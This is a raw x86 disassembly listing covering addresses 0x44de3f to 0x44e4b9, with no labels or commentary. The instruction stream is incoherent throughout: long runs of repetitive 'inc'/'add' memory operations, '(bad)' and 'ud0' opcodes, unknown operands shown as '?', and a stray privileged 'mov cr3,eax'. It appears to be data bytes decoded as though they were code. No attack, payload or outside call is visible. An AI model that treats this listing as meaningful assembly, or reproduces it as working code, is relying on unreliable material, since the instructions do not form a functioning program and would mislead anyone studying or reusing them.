  44de3f:	add    BYTE PTR [eax],al
  44de41:	sbb    edi,edi
  44de43:	add    BYTE PTR [eax],al
  44de45:	sbb    edi,edi
  44de47:	add    BYTE PTR [eax],al
  44de49:	sbb    bh,bh
  44de4b:	add    BYTE PTR [eax],al
  44de4d:	sbb    al,0xff
  44de4f:	add    BYTE PTR [ecx],al
  44de51:	add    bh,bh
  44de53:	or     eax,0x25ff7b18
  44de58:	inc    edi
  44de59:	ret    
  44de5a:	jmp    DWORD PTR ds:0x1bffa136
  44de60:	xor    ebx,DWORD PTR [edi+edi*8-0x4dbde4]
  44de67:	sbb    edi,DWORD PTR [edi]
  44de69:	ret    
  44de6a:	inc    DWORD PTR [eax]
  44de6c:	add    DWORD PTR [ebx],eax
  44de6e:	inc    DWORD PTR [eax]
  44de70:	add    BYTE PTR [edx],ah
  44de72:	inc    DWORD PTR [eax]
  44de74:	add    BYTE PTR [edi+edi*8],ah
  44de77:	add    BYTE PTR [eax],al
  44de79:	and    edi,edi
  44de7b:	add    BYTE PTR [eax],al
  44de7d:	and    edi,edi
  44de7f:	add    BYTE PTR [eax],al
  44de81:	and    edi,edi
  44de83:	add    BYTE PTR [ecx],al
  44de85:	add    bh,bh
  44de87:	pop    es
  44de88:	adc    bh,bh
  44de8a:	inc    DWORD PTR [edi]
  44de8c:	sbb    DWORD PTR [edi+0x7b220eff],ebp
  44de92:	call   DWORD PTR [edx+ebp*1]
  44de95:	je     0x44de96
  44de97:	sbb    eax,0x1cff672c
  44de9c:	cmp    eax,0x100ffa5
  44dea1:	add    bh,bh
  44dea3:	add    BYTE PTR [eax],al
  44dea5:	sbb    eax,0x1d0000ff
  44deaa:	inc    DWORD PTR [eax]
  44deac:	add    BYTE PTR [edx],bl
  44deae:	inc    DWORD PTR [eax]
  44deb0:	add    BYTE PTR [ebx],bl
  44deb2:	inc    DWORD PTR [ecx]
  44deb4:	or     BYTE PTR [esi],al
  44deb6:	call   DWORD PTR [ebx+ecx*2]
  44deb9:	scas   eax,DWORD PTR es:[edi]
  44deba:	dec    DWORD PTR ds:0xfffa725
  44dec0:	es mov bh,bh
  44dec3:	push   cs
  44dec4:	and    al,0x70
  44dec6:	inc    DWORD PTR [esi]
  44dec8:	adc    al,0x6a
  44deca:	push   DWORD PTR [ecx]
  44decc:	test   edi,ecx
  44dece:	inc    DWORD PTR [eax]
  44ded0:	add    DWORD PTR [edx],eax
  44ded2:	inc    DWORD PTR [ecx]
  44ded4:	add    DWORD PTR [eax],edx
  44ded6:	inc    DWORD PTR [eax]
  44ded8:	add    BYTE PTR ds:0x20100ff,cl
  44dede:	inc    DWORD PTR [ebx]
  44dee0:	or     al,0x7a
  44dee2:	inc    DWORD PTR ds:0x1ffb713
  44dee8:	(bad)  
  44deea:	dec    DWORD PTR [ecx]
  44deec:	and    DWORD PTR [ecx+0x632b1cff],esi
  44def2:	call   FWORD PTR [eax]
  44def4:	sub    eax,0x100ff9e
  44def9:	add    bh,bh
  44defb:	add    al,BYTE PTR [ecx]
  44defd:	pop    ss
  44defe:	inc    DWORD PTR [eax]
  44df00:	add    BYTE PTR [eax],al
  44df02:	inc    DWORD PTR [eax]
  44df04:	add    DWORD PTR [ebx],eax
  44df06:	inc    DWORD PTR [eax]
  44df08:	add    DWORD PTR [ebx],eax
  44df0a:	inc    DWORD PTR [eax]
  44df0c:	add    DWORD PTR [edx],eax
  44df0e:	inc    DWORD PTR [eax]
  44df10:	add    DWORD PTR [edx],eax
  44df12:	dec    DWORD PTR [ebx]
  44df14:	sbb    DWORD PTR [esi-0x3ab0d701],edx
  44df1a:	jmp    FWORD PTR ds:0x23ffaa40
  44df20:	xor    BYTE PTR [edx-0x4cbfe201],al
  44df26:	call   FWORD PTR [edi]
  44df28:	inc    edi
  44df29:	int3   
  44df2a:	inc    DWORD PTR [eax]
  44df2c:	add    DWORD PTR [ebx],eax
  44df2e:	inc    DWORD PTR [eax]
  44df30:	add    BYTE PTR [ecx],ah
  44df32:	inc    DWORD PTR [eax]
  44df34:	add    BYTE PTR [ecx],ah
  44df36:	inc    DWORD PTR [eax]
  44df38:	add    BYTE PTR [eax],ah
  44df3a:	inc    DWORD PTR [eax]
  44df3c:	add    BYTE PTR [eax],ah
  44df3e:	inc    DWORD PTR [eax]
  44df40:	add    BYTE PTR [edi],bl
  44df42:	inc    DWORD PTR [eax]
  44df44:	add    DWORD PTR [edx],eax
  44df46:	inc    DWORD PTR [eax]
  44df48:	add    DWORD PTR [edx],eax
  44df4a:	inc    DWORD PTR [edi]
  44df4c:	adc    bh,bh
  44df4e:	call   DWORD PTR [ecx]
  44df50:	xor    al,0xc9
  44df52:	call   DWORD PTR [esi]
  44df54:	xor    eax,0x2e13ffa8
  44df59:	xchg   ecx,eax
  44df5a:	dec    DWORD PTR [ebx]
  44df5c:	and    edx,DWORD PTR [edi+edi*8-0xfdff00]
  44df63:	add    BYTE PTR [eax],al
  44df65:	sbb    bh,bh
  44df67:	add    BYTE PTR [eax],al
  44df69:	sbb    eax,0x190000ff
  44df6e:	inc    DWORD PTR [eax]
  44df70:	add    BYTE PTR [esi],dl
  44df72:	inc    DWORD PTR [eax]
  44df74:	add    BYTE PTR [eax],al
  44df76:	inc    DWORD PTR [ebx]
  44df78:	adc    dl,BYTE PTR [esi-0x1]
  44df7b:	push   es
  44df7c:	adc    DWORD PTR [esi-0x1],esp
  44df7f:	sbb    BYTE PTR [ebx],ah
  44df81:	jl     0x44df82
  44df83:	or     ebx,DWORD PTR [ebx]
  44df85:	jns    0x44df86
  44df87:	adc    DWORD PTR [ebx],edx
  44df89:	dec    edx
  44df8a:	jmp    FWORD PTR [ecx+eax*2]
  44df8d:	scas   eax,DWORD PTR es:[edi]
  44df8e:	inc    DWORD PTR [eax]
  44df90:	add    DWORD PTR [edx],eax
  44df92:	inc    DWORD PTR [esi]
  44df94:	push   es
  44df95:	adc    edi,edi
  44df97:	add    BYTE PTR [eax],al
  44df99:	ud0    eax,DWORD PTR [eax]
  44df9c:	add    DWORD PTR [edx],eax
  44df9e:	inc    DWORD PTR [ecx]
  44dfa0:	pop    es
  44dfa1:	mov    edi,edi
  44dfa3:	add    al,0x12
  44dfa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44dfa6:	dec    DWORD PTR [eax]
  44dfa8:	sbb    BYTE PTR [edx-0x64f0f701],al
  44dfae:	call   DWORD PTR [ecx]
  44dfb0:	pop    ss
  44dfb1:	je     0x44dfb2
  44dfb3:	sbb    DWORD PTR ds:0x100ff8f,ebp
  44dfb9:	add    bh,bh
  44dfbb:	add    BYTE PTR [eax],al
  44dfbd:	adc    al,0xff
  44dfbf:	add    BYTE PTR [eax],al
  44dfc1:	add    bh,bh
  44dfc3:	add    BYTE PTR [ecx],al
  44dfc5:	add    bh,bh
  44dfc7:	add    eax,0x1affcf27
  44dfcc:	aas    
  44dfcd:	retf   0x20ff
  44dfd0:	cs cdq 
  44dfd2:	call   FWORD PTR [ecx]
  44dfd4:	sub    al,0xcb
  44dfd6:	jmp    DWORD PTR [esi]
  44dfd8:	inc    edx
  44dfd9:	sar    bh,0x1e
  44dfdc:	sub    al,0x95
  44dfde:	jmp    FWORD PTR ds:0x19ff7f35
  44dfe4:	xor    ebx,DWORD PTR [ecx-0x54cdea01]
  44dfea:	inc    DWORD PTR [eax]
  44dfec:	add    DWORD PTR [ebx],eax
  44dfee:	inc    DWORD PTR [eax]
  44dff0:	add    BYTE PTR [ebx],ah
  44dff2:	inc    DWORD PTR [eax]
  44dff4:	add    BYTE PTR [edx],ah
  44dff6:	inc    DWORD PTR [eax]
  44dff8:	add    BYTE PTR [ecx],ah
  44dffa:	inc    DWORD PTR [eax]
  44dffc:	add    BYTE PTR [edx],ah
  44dffe:	inc    DWORD PTR [eax]
  44e000:	add    BYTE PTR [edx],ah
  44e002:	inc    DWORD PTR [eax]
  44e004:	add    DWORD PTR [edx],eax
  44e006:	inc    DWORD PTR [edx]
  44e008:	add    eax,0x100ff15
  44e00d:	add    bh,bh
  44e00f:	add    BYTE PTR [ecx],al
  44e011:	add    edi,edi
  44e013:	adc    BYTE PTR [edi],ch
  44e015:	sahf   
  44e016:	call   DWORD PTR ds:0x7ff772b
  44e01c:	sbb    BYTE PTR [edx+0x20100ff],cl
  44e022:	inc    DWORD PTR [eax]
  44e024:	add    BYTE PTR [ecx],bl
  44e026:	inc    DWORD PTR [eax]
  44e028:	add    BYTE PTR [eax],bl
  44e02a:	inc    DWORD PTR [eax]
  44e02c:	add    BYTE PTR [ecx],bl
  44e02e:	inc    DWORD PTR [eax]
  44e030:	add    BYTE PTR [edi+edi*8],dl
  44e033:	add    BYTE PTR [eax],al
  44e035:	add    bh,bh
  44e037:	add    BYTE PTR [esi],al
  44e039:	and    bh,bh
  44e03b:	comiss xmm3,DWORD PTR [edi-0x58d4de01]
  44e042:	dec    DWORD PTR [edi]
  44e044:	pop    ss
  44e045:	outs   dx,BYTE PTR ds:[esi]
  44e046:	call   DWORD PTR ds:0x22ff2a11
  44e04c:	xor    BYTE PTR [ebp+0x30100ff],dh
  44e052:	dec    DWORD PTR [ecx]
  44e054:	or     BYTE PTR ds:0xc0000ff,dl
  44e05a:	inc    DWORD PTR [eax]
  44e05c:	add    DWORD PTR [edx],eax
  44e05e:	dec    DWORD PTR [eax]
  44e060:	pop    ss
  44e061:	sar    bh,1
  44e063:	or     DWORD PTR [esi],esi
  44e065:	sar    edi,cl
  44e067:	or     al,0x35
  44e069:	mov    esi,0x6f2826ff
  44e06e:	call   FWORD PTR [ebx]
  44e070:	push   ss
  44e071:	outs   dx,BYTE PTR ds:[esi]
  44e072:	dec    DWORD PTR [esp+ebx*1]
  44e075:	stos   BYTE PTR es:[edi],al
  44e076:	inc    DWORD PTR [eax]
  44e078:	add    DWORD PTR [edx],eax
  44e07a:	inc    DWORD PTR [edx]
  44e07c:	add    dl,BYTE PTR [edi]
  44e07e:	inc    DWORD PTR [eax]
  44e080:	add    BYTE PTR [esi],dl
  44e082:	inc    DWORD PTR [eax]
  44e084:	add    DWORD PTR [edx],eax
  44e086:	dec    DWORD PTR [eax]
  44e088:	adc    bh,bh
  44e08a:	jmp    FWORD PTR [ebx]
  44e08c:	pop    esp
  44e08d:	mov    edi,0x381b1dff
  44e092:	call   DWORD PTR [eax]
  44e094:	push   cs
  44e095:	inc    esp
  44e096:	call   DWORD PTR ds:0x25ff7f18
  44e09c:	sub    BYTE PTR [esi-0x1],bl
  44e09f:	sub    eax,0xeff6e2b
  44e0a4:	and    eax,0x2611ff97
  44e0a9:	test   bh,bh
  44e0ab:	add    BYTE PTR [ecx],al
  44e0ad:	add    edi,edi
  44e0af:	add    BYTE PTR [eax],al
  44e0b1:	pop    ds
  44e0b2:	inc    DWORD PTR [eax]
  44e0b4:	add    BYTE PTR ds:0x1d0000ff,bl
  44e0ba:	inc    DWORD PTR [eax]
  44e0bc:	add    BYTE PTR ds:0x1f0000ff,bl
  44e0c2:	inc    DWORD PTR [eax]
  44e0c4:	add    DWORD PTR [edx],eax
  44e0c6:	dec    DWORD PTR [ecx]
  44e0c8:	adc    edi,edi
  44e0ca:	dec    DWORD PTR [edx]
  44e0cc:	cmp    dh,bh
  44e0ce:	inc    DWORD PTR [edi]
  44e0d0:	sub    ch,BYTE PTR [ebx+0x2d0600ff]
  44e0d6:	inc    DWORD PTR [esi]
  44e0d8:	push   ss
  44e0d9:	jge    0x44e0da
  44e0db:	add    ecx,DWORD PTR ds:0x100ffbd
  44e0e1:	add    bh,bh
  44e0e3:	add    BYTE PTR [eax],al
  44e0e5:	pop    ss
  44e0e6:	inc    DWORD PTR [eax]
  44e0e8:	add    BYTE PTR [edi],dl
  44e0ea:	inc    DWORD PTR [eax]
  44e0ec:	add    BYTE PTR [ecx],bl
  44e0ee:	inc    DWORD PTR [eax]
  44e0f0:	add    BYTE PTR ds:0xff,dl
  44e0f6:	inc    DWORD PTR [ecx]
  44e0f8:	push   cs
  44e0f9:	dec    edi
  44e0fa:	dec    DWORD PTR [esp+ebx*1]
  44e0fd:	(bad)  
  44e0fe:	call   DWORD PTR [edi]
  44e100:	sbb    esi,DWORD PTR [ebp-0x1]
  44e103:	nop    DWORD PTR [edi-0x1]
  44e107:	push   ds
  44e108:	and    DWORD PTR [ebp-0x1],eax
  44e10b:	sbb    ebp,DWORD PTR [ecx]
  44e10d:	mov    esp,0x20100ff
  44e112:	dec    DWORD PTR [ecx]
  44e114:	pop    es
  44e115:	adc    edi,edi
  44e117:	add    BYTE PTR [eax],al
  44e119:	or     edi,edi
  44e11b:	add    BYTE PTR [ecx],al
  44e11d:	add    bh,bh
  44e11f:	add    al,0xf
  44e121:	test   eax,0xad3012ff
  44e126:	jmp    DWORD PTR [ebx]
  44e128:	dec    ebx
  44e129:	scas   eax,DWORD PTR es:[edi]
  44e12a:	jmp    FWORD PTR [ebx]
  44e12c:	aaa    
  44e12d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e12e:	jmp    DWORD PTR [esi]
  44e130:	and    BYTE PTR [ecx-0x1],cl
  44e133:	nop    DWORD PTR [ebp+0x30100ff]
  44e13a:	inc    DWORD PTR [ebx]
  44e13c:	add    dl,BYTE PTR [ebx]
  44e13e:	inc    DWORD PTR [eax]
  44e140:	add    BYTE PTR [edi+edi*8],dl
  44e143:	add    al,BYTE PTR [ecx]
  44e145:	adc    eax,0x20100ff
  44e14a:	dec    DWORD PTR [eax]
  44e14c:	adc    edi,edi
  44e14e:	call   DWORD PTR [ecx]
  44e150:	pop    ss
  44e151:	outs   dx,DWORD PTR ds:[esi]
  44e152:	call   FWORD PTR [edi]
  44e154:	sbb    BYTE PTR [ebx],ch
  44e156:	call   DWORD PTR [edi]
  44e158:	adc    al,0x37
  44e15a:	call   FWORD PTR [edx+ebx*1]
  44e15d:	jmp    DWORD PTR gs:[edi+ebx*1]
  44e161:	notrack call DWORD PTR [ecx]
  44e164:	adc    dl,BYTE PTR [ebp-0x1]
  44e167:	or     edx,DWORD PTR [edi]
  44e169:	(bad)  
  44e16a:	inc    DWORD PTR [eax]
  44e16c:	add    DWORD PTR [ebx],eax
  44e16e:	inc    DWORD PTR [eax]
  44e170:	add    BYTE PTR [edx],bl
  44e172:	inc    DWORD PTR [eax]
  44e174:	add    BYTE PTR [edx],bl
  44e176:	inc    DWORD PTR [eax]
  44e178:	add    BYTE PTR [ebx],bl
  44e17a:	inc    DWORD PTR [eax]
  44e17c:	add    BYTE PTR [edx],bl
  44e17e:	inc    DWORD PTR [eax]
  44e180:	add    BYTE PTR [edx],bl
  44e182:	inc    DWORD PTR [eax]
  44e184:	add    DWORD PTR [edx],eax
  44e186:	dec    DWORD PTR [ecx]
  44e188:	adc    bh,bh
  44e18a:	call   FWORD PTR [ebx]
  44e18c:	ds mov edi,0x6f2a19ff
  44e192:	dec    DWORD PTR [ebx*1+0x100ff7a]
  44e199:	add    bh,bh
  44e19b:	or     BYTE PTR [edx],dl
  44e19d:	(bad)  
  44e19e:	inc    DWORD PTR [eax]
  44e1a0:	add    DWORD PTR [edx],eax
  44e1a2:	inc    DWORD PTR [eax]
  44e1a4:	add    BYTE PTR [esi],dl
  44e1a6:	inc    DWORD PTR [eax]
  44e1a8:	add    BYTE PTR ds:0x150000ff,dl
  44e1ae:	inc    DWORD PTR [eax]
  44e1b0:	add    BYTE PTR [esi],dl
  44e1b2:	inc    DWORD PTR [eax]
  44e1b4:	add    BYTE PTR [eax],al
  44e1b6:	inc    DWORD PTR [ebx]
  44e1b8:	or     al,BYTE PTR [ebx-0x1]
  44e1bb:	or     BYTE PTR [ebx],cl
  44e1bd:	pop    ecx
  44e1be:	call   DWORD PTR ds:0xcff3c15
  44e1c4:	adc    BYTE PTR [ebx-0x1],ah
  44e1c7:	adc    BYTE PTR [esi],dl
  44e1c9:	push   0xffffffff
  44e1cb:	sbb    ah,BYTE PTR [esi]
  44e1cd:	xchg   esp,eax
  44e1ce:	inc    DWORD PTR [eax]
  44e1d0:	add    DWORD PTR [ebx],eax
  44e1d2:	dec    DWORD PTR [edx]
  44e1d4:	or     DWORD PTR [ebx],edx
  44e1d6:	inc    DWORD PTR [eax]
  44e1d8:	add    BYTE PTR [ecx],cl
  44e1da:	inc    DWORD PTR [eax]
  44e1dc:	add    DWORD PTR [edx],eax
  44e1de:	inc    DWORD PTR ds:0x16ffb30c
  44e1e4:	sub    edi,DWORD PTR [edi+edi*8+0x21]
  44e1e8:	inc    esi
  44e1e9:	lods   eax,DWORD PTR ds:[esi]
  44e1ea:	jmp    DWORD PTR [edi*1+0x1413ff9b]
  44e1f1:	jnp    0x44e1f2
  44e1f3:	or     al,0x17
  44e1f5:	xchg   edi,eax
  44e1f6:	inc    DWORD PTR [eax]
  44e1f8:	add    DWORD PTR [ebx],eax
  44e1fa:	inc    DWORD PTR [eax]
  44e1fc:	add    BYTE PTR [eax],dl
  44e1fe:	inc    DWORD PTR [eax]
  44e200:	add    BYTE PTR [ecx],dl
  44e202:	inc    DWORD PTR [eax]
  44e204:	add    BYTE PTR [ecx],dl
  44e206:	inc    DWORD PTR [eax]
  44e208:	add    BYTE PTR [ecx],dl
  44e20a:	inc    DWORD PTR [eax]
  44e20c:	add    DWORD PTR [edx],eax
  44e20e:	dec    DWORD PTR [eax]
  44e210:	adc    bh,bh
  44e212:	dec    DWORD PTR [ebx]
  44e214:	sbb    bh,bh
  44e216:	dec    DWORD PTR [ebx]
  44e218:	sbb    edi,edi
  44e21a:	dec    DWORD PTR ds:0xeffff1b
  44e220:	push   ds
  44e221:	(bad)  
  44e222:	dec    DWORD PTR [esi]
  44e224:	sbb    eax,0x1b0dffff
  44e229:	(bad)  
  44e22a:	inc    DWORD PTR [eax]
  44e22c:	add    DWORD PTR [ebx],eax
  44e22e:	inc    DWORD PTR [eax]
  44e230:	add    BYTE PTR [edi],dl
  44e232:	inc    DWORD PTR [eax]
  44e234:	add    BYTE PTR [ecx],bl
  44e236:	inc    DWORD PTR [eax]
  44e238:	add    BYTE PTR [edi],dl
  44e23a:	inc    DWORD PTR [eax]
  44e23c:	add    BYTE PTR [ecx],bl
  44e23e:	inc    DWORD PTR [eax]
  44e240:	add    BYTE PTR [eax],bl
  44e242:	inc    DWORD PTR [eax]
  44e244:	add    DWORD PTR [edx],eax
  44e246:	inc    DWORD PTR [edx]
  44e248:	adc    al,BYTE PTR [edi+edi*8-0x51d7f0]
  44e24f:	adc    BYTE PTR [ebx],dl
  44e251:	sub    al,0xff
  44e253:	adc    dl,BYTE PTR [esi]
  44e255:	sub    eax,0x230705ff
  44e25a:	inc    DWORD PTR [eax]
  44e25c:	add    DWORD PTR [edx],eax
  44e25e:	inc    DWORD PTR [eax]
  44e260:	add    DWORD PTR [edx],eax
  44e262:	inc    DWORD PTR [eax]
  44e264:	add    BYTE PTR [ebx],dl
  44e266:	inc    DWORD PTR [eax]
  44e268:	add    BYTE PTR [ecx],dl
  44e26a:	inc    DWORD PTR [eax]
  44e26c:	add    BYTE PTR ds:0x110000ff,dl
  44e272:	inc    DWORD PTR [eax]
  44e274:	add    BYTE PTR [eax],al
  44e276:	dec    DWORD PTR [eax]
  44e278:	or     DWORD PTR ds:0x40100cff,ebx
  44e27e:	call   DWORD PTR [eax]
  44e280:	push   cs
  44e281:	call   DWORD PTR cs:[eax]
  44e284:	or     al,0x1d
  44e286:	inc    DWORD PTR [ecx]
  44e288:	pop    es
  44e289:	push   0xffffffff
  44e28b:	adc    eax,0xff9118
  44e290:	add    DWORD PTR [ebx],eax
  44e292:	dec    DWORD PTR [ebx]
  44e294:	or     dl,BYTE PTR [ebx]
  44e296:	inc    DWORD PTR [eax]
  44e298:	add    BYTE PTR [edx],cl
  44e29a:	inc    DWORD PTR [eax]
  44e29c:	add    DWORD PTR [ebx],eax
  44e29e:	inc    DWORD PTR [eax]
  44e2a0:	add    al,BYTE PTR [edi+edi*8-0x62ddee]
  44e2a7:	pop    ss
  44e2a8:	cmp    dh,BYTE PTR [edx-0x58b4d601]
  44e2ae:	call   FWORD PTR [esi]
  44e2b0:	sbb    eax,0xf07ff77
  44e2b5:	mov    ?,edi
  44e2b7:	add    BYTE PTR [ecx],al
  44e2b9:	add    bh,bh
  44e2bb:	add    BYTE PTR [eax],al
  44e2bd:	add    bh,bh
  44e2bf:	add    BYTE PTR [eax],al
  44e2c1:	push   cs
  44e2c2:	inc    DWORD PTR [eax]
  44e2c4:	add    BYTE PTR [edi],cl
  44e2c6:	inc    DWORD PTR [eax]
  44e2c8:	add    BYTE PTR [esi],cl
  44e2ca:	inc    DWORD PTR [eax]
  44e2cc:	add    BYTE PTR [esi],cl
  44e2ce:	inc    DWORD PTR [eax]
  44e2d0:	add    DWORD PTR [edx],eax
  44e2d2:	inc    DWORD PTR [eax]
  44e2d4:	add    DWORD PTR [ebx],eax
  44e2d6:	inc    DWORD PTR [eax]
  44e2d8:	add    DWORD PTR [ebx],eax
  44e2da:	inc    DWORD PTR [eax]
  44e2dc:	add    DWORD PTR [ebx],eax
  44e2de:	inc    DWORD PTR [eax]
  44e2e0:	add    DWORD PTR [ebx],eax
  44e2e2:	inc    DWORD PTR [eax]
  44e2e4:	add    DWORD PTR [ebx],eax
  44e2e6:	inc    DWORD PTR [eax]
  44e2e8:	add    DWORD PTR [ebx],eax
  44e2ea:	inc    DWORD PTR [eax]
  44e2ec:	add    DWORD PTR [ebx],eax
  44e2ee:	inc    DWORD PTR [eax]
  44e2f0:	add    BYTE PTR ds:0x170000ff,dl
  44e2f6:	inc    DWORD PTR [eax]
  44e2f8:	add    BYTE PTR [edi],dl
  44e2fa:	inc    DWORD PTR [eax]
  44e2fc:	add    BYTE PTR [edi],dl
  44e2fe:	inc    DWORD PTR [eax]
  44e300:	add    BYTE PTR [edi+edi*8],dl
  44e303:	add    BYTE PTR [ecx],al
  44e305:	add    bh,bh
  44e307:	add    DWORD PTR [esi],ecx
  44e309:	cmp    bh,0xe
  44e30c:	and    ebp,DWORD PTR [esi+0x35140dff]
  44e312:	call   DWORD PTR [ecx]
  44e314:	adc    BYTE PTR [ebx],ch
  44e316:	call   DWORD PTR [ebx]
  44e318:	adc    eax,0x100ff35
  44e31d:	add    edi,edi
  44e31f:	add    BYTE PTR [ecx],al
  44e321:	add    bh,bh
  44e323:	add    BYTE PTR [eax],al
  44e325:	adc    bh,bh
  44e327:	add    BYTE PTR [eax],al
  44e329:	adc    bh,bh
  44e32b:	add    BYTE PTR [eax],al
  44e32d:	adc    edi,edi
  44e32f:	add    BYTE PTR [eax],al
  44e331:	or     eax,0xff
  44e336:	inc    DWORD PTR [ecx]
  44e338:	add    al,BYTE PTR [edi]
  44e33a:	dec    DWORD PTR [edi+ecx*1]
  44e33d:	cmp    edi,edi
  44e33f:	adc    cl,BYTE PTR [edi]
  44e341:	dec    DWORD PTR cs:[edi]
  44e344:	or     eax,0x700ff1f
  44e349:	jae    0x44e34a
  44e34b:	or     DWORD PTR [esi],edx
  44e34d:	(bad)  
  44e34e:	inc    DWORD PTR [eax]
  44e350:	add    DWORD PTR [ebx],eax
  44e352:	dec    DWORD PTR [edx]
  44e354:	or     DWORD PTR [ecx],edx
  44e356:	inc    DWORD PTR [eax]
  44e358:	add    BYTE PTR [eax],cl
  44e35a:	inc    DWORD PTR [eax]
  44e35c:	add    DWORD PTR [edx],eax
  44e35e:	inc    DWORD PTR [esi]
  44e360:	cmpps  xmm7,xmm7,0x19
  44e364:	sub    DWORD PTR [ecx-0x67b9d101],esp
  44e36a:	jmp    FWORD PTR [eax]
  44e36c:	cmp    BYTE PTR [eax-0x1],dh
  44e36f:	sbb    ebx,DWORD PTR [eax]
  44e371:	aaa    
  44e372:	dec    DWORD PTR [ecx]
  44e374:	adc    al,0xff
  44e376:	inc    DWORD PTR [eax]
  44e378:	add    DWORD PTR [ebx],eax
  44e37a:	inc    DWORD PTR [eax]
  44e37c:	add    BYTE PTR [eax],al
  44e37e:	inc    DWORD PTR [eax]
  44e380:	add    BYTE PTR ds:0xd0000ff,cl
  44e386:	inc    DWORD PTR [eax]
  44e388:	add    BYTE PTR ds:0xe0000ff,cl
  44e38e:	inc    DWORD PTR [eax]
  44e390:	add    BYTE PTR [edi],cl
  44e392:	inc    DWORD PTR [eax]
  44e394:	add    BYTE PTR [eax],dl
  44e396:	inc    DWORD PTR [eax]
  44e398:	add    BYTE PTR [edx],dl
  44e39a:	inc    DWORD PTR [eax]
  44e39c:	add    BYTE PTR [ecx],dl
  44e39e:	inc    DWORD PTR [eax]
  44e3a0:	add    BYTE PTR [eax],dl
  44e3a2:	inc    DWORD PTR [eax]
  44e3a4:	add    BYTE PTR [edx],dl
  44e3a6:	inc    DWORD PTR [eax]
  44e3a8:	add    BYTE PTR [ebx],dl
  44e3aa:	inc    DWORD PTR [eax]
  44e3ac:	add    BYTE PTR [edi+edi*8],dl
  44e3af:	add    eax,DWORD PTR [ebx]
  44e3b1:	push   ss
  44e3b2:	inc    DWORD PTR [eax]
  44e3b4:	add    BYTE PTR [edx],dl
  44e3b6:	inc    DWORD PTR [eax]
  44e3b8:	add    BYTE PTR [edi+edi*8],dl
  44e3bb:	add    BYTE PTR [eax],al
  44e3bd:	adc    eax,0x130000ff
  44e3c2:	inc    DWORD PTR [eax]
  44e3c4:	add    DWORD PTR [edx],eax
  44e3c6:	inc    DWORD PTR [ebx]
  44e3c8:	adc    DWORD PTR [edi+edi*8+0xb],edi
  44e3cc:	sbb    ebp,DWORD PTR [ecx+0x410a03ff]
  44e3d2:	dec    DWORD PTR [esi]
  44e3d4:	adc    DWORD PTR [ebx],ebp
  44e3d6:	call   DWORD PTR [eax]
  44e3d8:	adc    BYTE PTR [ebx],ch
  44e3da:	inc    DWORD PTR ds:0xff460b
  44e3e0:	add    DWORD PTR [ebx],eax
  44e3e2:	inc    DWORD PTR [eax]
  44e3e4:	add    BYTE PTR [eax],dl
  44e3e6:	inc    DWORD PTR [eax]
  44e3e8:	add    BYTE PTR [edi],cl
  44e3ea:	inc    DWORD PTR [eax]
  44e3ec:	add    BYTE PTR [edi+edi*8],cl
  44e3ef:	add    BYTE PTR [eax],al
  44e3f1:	or     eax,0x100ff
  44e3f6:	inc    DWORD PTR ds:0x4ff4609
  44e3fc:	add    eax,0x1010ff26
  44e401:	and    al,0xff
  44e403:	and    al,0x22
  44e405:	dec    ebx
  44e406:	dec    DWORD PTR [esi]
  44e408:	adc    BYTE PTR [edi-0x1],al
  44e40b:	or     DWORD PTR [edx],edx
  44e40d:	(bad)  
  44e40e:	inc    DWORD PTR [eax]
  44e410:	add    DWORD PTR [ebx],eax
  44e412:	dec    DWORD PTR [eax]
  44e414:	pop    es
  44e415:	ud0    eax,DWORD PTR [eax]
  44e418:	add    BYTE PTR [esi],al
  44e41a:	inc    DWORD PTR [eax]
  44e41c:	add    DWORD PTR [edx],eax
  44e41e:	dec    DWORD PTR [eax]
  44e420:	adc    esp,eax
  44e422:	call   FWORD PTR ds:0x20ff2b18
  44e428:	and    edx,DWORD PTR [ebp-0x1]
  44e42b:	and    eax,0x20ff7124
  44e430:	and    edx,DWORD PTR [edx-0x1]
  44e433:	adc    al,0x24
  44e435:	xchg   ecx,eax
  44e436:	dec    DWORD PTR [edx]
  44e438:	push   ss
  44e439:	(bad)  
  44e43a:	inc    DWORD PTR [eax]
  44e43c:	add    DWORD PTR [edx],eax
  44e43e:	inc    DWORD PTR [eax]
  44e440:	add    BYTE PTR [edi+edi*8],cl
  44e443:	add    BYTE PTR [eax],al
  44e445:	or     edi,edi
  44e447:	add    BYTE PTR [eax],al
  44e449:	or     al,0xff
  44e44b:	add    BYTE PTR [eax],al
  44e44d:	or     al,0xff
  44e44f:	add    BYTE PTR [eax],al
  44e451:	ud0    eax,DWORD PTR [eax]
  44e454:	add    BYTE PTR [ecx],dl
  44e456:	inc    DWORD PTR [eax]
  44e458:	add    BYTE PTR [eax],dl
  44e45a:	inc    DWORD PTR [eax]
  44e45c:	add    BYTE PTR [edx],dl
  44e45e:	inc    DWORD PTR [eax]
  44e460:	add    BYTE PTR [eax],dl
  44e462:	inc    DWORD PTR [eax]
  44e464:	add    BYTE PTR [eax],dl
  44e466:	inc    DWORD PTR [eax]
  44e468:	add    BYTE PTR [eax],dl
  44e46a:	inc    DWORD PTR [eax]
  44e46c:	add    BYTE PTR [eax],dl
  44e46e:	inc    DWORD PTR [eax]
  44e470:	add    BYTE PTR [eax],dl
  44e472:	inc    DWORD PTR [eax]
  44e474:	add    BYTE PTR [edi],cl
  44e476:	inc    DWORD PTR [eax]
  44e478:	add    BYTE PTR [eax],dl
  44e47a:	inc    DWORD PTR [eax]
  44e47c:	add    BYTE PTR [ecx],dl
  44e47e:	inc    DWORD PTR [eax]
  44e480:	add    BYTE PTR [eax],dl
  44e482:	inc    DWORD PTR [eax]
  44e484:	add    DWORD PTR [edx],eax
  44e486:	inc    DWORD PTR [edx]
  44e488:	or     eax,0xf03ff76
  44e48d:	mov    edi,?
  44e48f:	add    DWORD PTR ds:0x160fff45,eax
  44e495:	xor    bh,bh
  44e497:	or     al,0x10
  44e499:	sub    bh,bh
  44e49b:	mov    cr3,eax
  44e49e:	inc    DWORD PTR [eax]
  44e4a0:	add    DWORD PTR [ebx],eax
  44e4a2:	inc    DWORD PTR [eax]
  44e4a4:	add    BYTE PTR [esi],cl
  44e4a6:	inc    DWORD PTR [eax]
  44e4a8:	add    BYTE PTR [edi+edi*8],cl
  44e4ab:	add    BYTE PTR [eax],al
  44e4ad:	or     edi,edi
  44e4af:	add    BYTE PTR [eax],al
  44e4b1:	or     bh,bh
  44e4b3:	add    BYTE PTR [eax],al
  44e4b5:	add    bh,bh
  44e4b7:	or     DWORD PTR [eax],ebx
  44e4b9:	xchg   edx,eax
